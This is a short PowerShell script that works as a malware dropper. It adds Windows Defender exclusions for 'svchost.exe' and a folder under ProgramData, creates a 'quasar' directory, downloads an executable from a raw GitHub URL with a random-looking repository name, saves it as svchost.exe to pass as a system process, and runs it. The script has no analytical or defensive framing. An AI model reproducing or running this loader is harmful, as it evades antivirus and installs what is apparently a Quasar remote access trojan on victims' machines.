Add-MpPreference -ExclusionPrcoess "svchost.exe"
Add-MpPreference -ExlcusionPath "C:\ProgramData\zDATAxD"
mkdir C:\ProgramData\zDATAxD
cd C:\programdata\zdataxd
mkdir quasar
cd quasar
$source = 'https://raw.githubusercontent.com/ErrorLoadingUsername-404/320rk49asrotji4ejtrsltj3o4t34t/main/svchost.exe'
$destination = 'C:\ProgramData\zDATAxD\quasar\svchost.exe'
Invoke-WebRequest -Uri $source -OutFile $destination
start C:\programdata\zdataxd\quasar\svchost.exe
